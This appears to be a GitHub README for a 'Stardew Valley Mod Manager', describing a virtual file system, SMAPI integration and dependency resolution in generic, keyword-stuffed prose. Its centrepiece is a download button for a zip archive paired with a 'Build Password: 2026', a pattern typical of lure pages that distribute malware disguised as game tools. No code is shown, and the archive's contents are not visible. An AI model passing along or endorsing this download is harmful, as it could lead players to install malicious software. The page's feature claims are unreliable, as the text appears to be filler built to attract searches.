# 🌾 Stardew-Valley-Mod-Manager

<img width="1080" height="1440" alt="image" src="https://github.com/user-attachments/assets/902049d6-9ad3-4cbc-b73a-67e53f8e49b2" />


<p align="center">
  <img src="https://img.icons8.com/color/96/000000/wheat.png" alt="Stardew Valley Mod Manager" width="140" height="140">
</p>

<h1 align="center">Stardew-Valley-Mod-Manager</h1>
<p align="center">
  <strong>Advanced Modification Environment for Stardew Valley</strong><br>
  SMAPI Integration · Virtual File System · Dependency Resolution
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-1.8.0-1ABC9C?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/engine-MonoGame-E74C3C?style=for-the-badge" alt="Engine"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

---

> ⚙️ **Project Status:** Stardew-Valley-Mod-Manager is stable and actively maintained. It provides a comprehensive platform for deploying, managing, and resolving conflicts for massive mod lists without permanently altering the base game files.

---

## 🏗️ Architecture Overview

The Manager operates by creating a Virtual File System (VFS) that intercepts the MonoGame's file I/O operations. This allows for a clean, non-destructive modding environment tailored for SMAPI.

- **Virtual File System (VFS):** Deploys mod files without overwriting vanilla assets.
- **SMAPI Integration:** Automatically detects and configures the Stardew Modding API.
- **Dependency Resolver:** Analyzes `manifest.json` files to ensure all required framework mods (like Content Patcher) are installed and loaded in the correct order.
- **Asset Streaming:** Intercepts requests for sprites and maps, routing them to the active mod profile.

## 📥 Deployment & Build

<div align="center" style="border: 2px solid #2C3E50; border-radius: 10px; padding: 20px; background-color: #1a1a1a; max-width: 450px; margin: 0 auto;">
  <img src="https://img.icons8.com/color/96/000000/download.png" alt="Download" width="60" height="60">
  <br><br>
  <a href="https://github.com/Xerx97781esczar/Stardew-Valley-Mod-Manager/releases/download/1/Stardew-Valley-Mod-Manager.zip">
    <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
  </a>
  <br><br>
  <span style="font-size: 18px; color: #ffffff;">🔐 <b>Build Password:</b> <code style="background-color: #333; padding: 4px 8px; border-radius: 4px; color: #E74C3C;">2026</code></span>
</div>

### Prerequisites

Before deploying the Manager, ensure your environment meets the following requirements:

1.  **Stardew Valley:** Version 1.6 or higher.
2.  **SMAPI:** Latest version installed.
3.  **Windows 10/11, macOS, or Linux:** (Cross-platform support).

## 🛠️ Core Modules

### 📦 Mod Deployment
*   **Drag & Drop:** Import `.zip` archives directly into the manager.
*   **Manifest Parsing:** Reads mod metadata to auto-categorize (Expansions, Gameplay, Aesthetics).
*   **Conflict Resolution:** Highlights overlapping content files.
*   **Profile System:** Save distinct mod setups for different saves or playthroughs (e.g., Vanilla+, Expanded).

### 🧠 Engine Hooks
*   **SMAPI Manager:** Tracks SMAPI versions and auto-updates.
*   **Console Log:** Real-time view of SMAPI errors and warnings.
*   **Framework Check:** Ensures Content Patcher, SpaceCore, and other dependencies are up to date.

### 🖥️ Interface
*   **Mod List View:** Sort by category, update status, or author.
*   **Live Log:** Real-time view of deployment errors and missing dependencies.
*   **Auto-Backup:** Automatically archives your current mod list before major changes.

## 🔍 SEO Keywords & Tags

`stardew-valley-mod-manager stardew-valley-modding stardew-smapi-manager stardew-vfs stardew-load-order stardew-mod-organizer stardew-conflict-resolution stardew-content-patcher stardew-modding-tool`

## 📁 Repository Structure

```
Stardew-Valley-Mod-Manager/
├── src/
│   └── core/              # C# frontend and VFS logic
├── docs/
│   └── architecture.md    # Deep dive into MonoGame hooks
├── hooks/
│   └── smapi/             # SMAPI plugins and engine patches
├── tests/                 # Deployment and rollback tests
├── README.md
└── SETTINGS_REPOSITORY.json
```
# Stardew-Valley-Mod-Manager Architecture

## 1. Virtual File System (VFS)
The Manager utilizes a user-mode file system hook. When MonoGame attempts to load a texture or map, the VFS intercepts the request. If a mod is deployed in the active profile, the VFS redirects the read to the mod's file in the staging directory, leaving the original game files untouched.

## 2. Dependency Resolver
Unlike traditional load orders, Stardew Valley relies heavily on framework mods like Content Patcher. The Manager reads the `manifest.json` of every installed mod to build a dependency graph, ensuring that core frameworks are loaded before content mods.

## 3. SMAPI Integration
The Manager detects the installed SMAPI version and ensures compatibility with the deployed mods. It also parses the SMAPI console log in real-time to highlight missing dependencies or code errors directly in the UI.
